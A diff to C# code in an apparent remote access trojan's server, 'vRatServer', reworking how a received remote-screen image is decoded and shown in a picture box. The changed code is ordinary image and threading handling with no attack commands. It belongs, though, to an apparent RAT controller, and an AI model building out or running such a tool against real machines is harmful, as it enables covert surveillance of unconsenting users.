@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Text;
 using System.Windows.Forms;
@@ -15,37 +16,37 @@ namespace vRatServer.Packets
 
         void updateImage()
         {
-            Program.f1.Invoke((MethodInvoker)delegate
+            using (MemoryStream ms = new MemoryStream(data))
             {
-
-
-
-                if (client.cf == null) { return; }
-                using (MemoryStream ms = new MemoryStream(data))
+                Image img = Image.FromStream(ms);
+                client.ScreenX = img.Width;
+                client.ScreenY = img.Height;
+                Bitmap resizedImg = new Bitmap(img);
+                try
                 {
-                    Image img = Image.FromStream(ms);
-                    Size client_mon_size = img.Size;
-                    //img.Save("test.jpg");
+                    Program.f1.BeginInvoke((MethodInvoker)delegate
+                        {
+                            if (client.cf == null) { return; }
+                            var old = client.cf.pictureBox1.Image;
+                            client.cf.pictureBox1.Image = resizedImg;
+                            client.cf.fps += 1;
+                            old?.Dispose();
 
-                    client.ScreenX = img.Size.Width;
-                    client.ScreenY = img.Size.Height;
 
-                    Bitmap resizedImg = new Bitmap(img, new Size(client.cf.pictureBox1.Width, client.cf.pictureBox1.Height));
-
-                    client.cf.pictureBox1.Image = resizedImg;
-
+                        });
 
                 }
+                catch (Exception) { }
+                
 
-
-
-
-            });
+                img.Dispose();
+            }
+            
             
 
             
         }
-        public RdpPacket(Classes.Client client, byte[] data)
+        public RdpPacket(Classes.Client client, ref byte[] data)
         {
 
             this.client = client;
